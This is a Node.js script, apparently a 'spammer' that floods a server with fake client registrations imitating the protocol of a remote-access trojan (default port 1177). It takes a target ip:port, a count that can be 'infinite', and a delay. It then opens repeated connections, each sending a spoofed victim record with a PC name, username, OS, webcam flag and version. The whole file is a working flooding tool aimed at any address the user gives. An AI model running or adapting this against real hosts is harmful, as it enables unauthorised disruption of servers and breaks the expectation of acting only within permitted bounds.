var net = require('net');
var config = require('./config.json');
var rndconfig = require('./config_random.json');
if (process.argv.length < 6 || process.argv.length > 6) {
    console.log("Can't attack please make sure to execute: node app.js ip:port count delay mode ex node app.js 192.233.122.21:1177 100 15 config, mode could be either config or random, count could be infinite string.");
    process.exit(0);
}
var payload;
var ip = process.argv[2].split(':')[0];
var port = process.argv[2].split(':')[1];
let i = 0;
let bru = 0;

function choose(choices) {
    var index = Math.floor(Math.random() * choices.length);
    return choices[index];
}

function next() {
    if (process.argv[3] === "infinite") {
        bru = i + 1;
    } else {
        bru = process.argv[3];
    }
    if (i < bru) {
        i++
        setTimeout(() => {
            createFakeClient();
            next();
        }, process.argv[4])
    }
}
next()

function createFakeClient() {
    const socket = net.createConnection(port, ip, () => {
        switch (process.argv[5]) {
            case 'config':
                payload = `ll|'|'|${Buffer.from(config.victim_string_prefix).toString('base64')}|'|'|${config.pc_name}|'|'|${config.username}|'|'|${config.install_time}|'|'||'|'|${config.os_info}|'|'|${config.cam}|'|'|${config.ver}|'|'|..|'|'|${Buffer.from(config.foreground_window).toString('base64')}|'|'|`;
                break;
            case 'random':
                payload = `ll|'|'|${Buffer.from(choose(rndconfig.random_victim_string_prefixes)).toString('base64')}|'|'|${choose(rndconfig.username) + "-PC"}|'|'|${choose(rndconfig.username)}|'|'|${config.install_time}|'|'||'|'|${choose(["MacOS", "Linux", "Windows"])} ${choose(["XP", "7", "8", "8.1", "10"])} ${choose(["Home Premium", "Pro", "Professional", "Ultimate", "Enterprise"])} x69|'|'|${choose(["Yes", "No", "Maybe", "Talvez."])}|'|'|${choose(["0.0d", "0.1d", "0.2d", "0.3d", "0.4d", "0.5d", "0.6d", "0.7d", "0.8d", "0.9d", "0.10d"])}|'|'|..|'|'|${Buffer.from(choose(rndconfig.foreground)).toString('base64')}|'|'|`;
                break;
                default:
                    console.log("Wrong mode");
                    process.exit(0);
        }
        var complete_payload = payload.length + '\x00' + payload;
        console.log(`(${i}) Attacking with Payload: ` + complete_payload + "\n");
        socket.write(complete_payload);
    });
    socket.on('error', (data) => {
        console.log("Connection was Closed Unexpectedly or was closed already, closing spammer.");
        process.exit(0);
    })
}